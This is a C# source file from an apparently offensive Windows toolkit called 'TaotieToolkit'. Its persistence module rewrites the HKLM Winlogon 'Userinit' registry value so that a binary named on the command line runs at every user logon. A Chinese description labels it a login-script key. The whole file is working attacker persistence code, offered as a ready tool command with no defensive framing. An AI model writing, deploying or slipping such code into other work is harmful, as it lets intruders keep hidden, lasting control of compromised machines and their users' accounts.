using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using TaotieToolkit.config;

namespace TaotieToolkit.modules.Persistence
{
    internal class ElevatedRegistryUserInitKey : ICommand, ICommandMarker
    {
        public string Name => "ElevatedRegistryUserInitKey";
        public string Description => "在本地计算机的注册表中创建一个键，用于在登录时运行脚本。";
        public void Execute(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("\t[-] Parameter error");
                return;
            }
            string binpath = args[0];
            try
            {
                string keyname = "Userinit";
                string updatedval = String.Format("C:\\windows\\system32\\userinit.exe,{0}", binpath);
                RegistryKey regkey;
                regkey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                regkey.SetValue(keyname, updatedval);
                regkey.Close();
                Console.WriteLine("[+] Updated Elevated HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon key UserInit and set to {1}", keyname, updatedval);
            }
            catch (UnauthorizedAccessException e)
            {
                Console.WriteLine("[-] Error: {0}", e.Message);
            }
        }

    }
}
